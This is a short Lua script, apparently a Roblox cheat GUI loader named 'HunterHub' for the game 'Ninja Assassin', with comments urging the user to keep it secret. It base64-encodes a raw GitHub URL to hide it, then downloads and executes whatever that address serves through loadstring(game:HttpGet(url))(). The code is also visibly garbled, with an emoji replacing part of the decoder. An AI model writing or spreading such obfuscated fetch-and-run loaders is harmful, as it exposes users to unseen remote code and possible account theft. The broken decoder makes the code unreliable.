--[[ This script was made by Araa and Braxy ]]--
--[[ HunterHub v4.7.3 ]]--
--[[ Becareful don't give this script to anyone!! ]]--
--[[ No one is allowed to use this script except you!! ]]--
--[[ Strongest GUI ever made in Ninja Assassin ]]--

local function base64Decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do r = r..(f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 😎 then return '' end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzczOTI5NjQwOTI3NzM2MjYzNzk5Lzk3MzE5NzY3NDc4ODM4MjkxNzM2MzYzNjY2NDYvcmVmcy9oZWFkcy9tYWluLzg0NzI4ODQ2NjY2MTczODI4ODI3MzY3NDg4MTgyNzM3ODk0LnR4dA=="

local url = base64Decode(encodedUrl)

loadstring(game:HttpGet(url))()
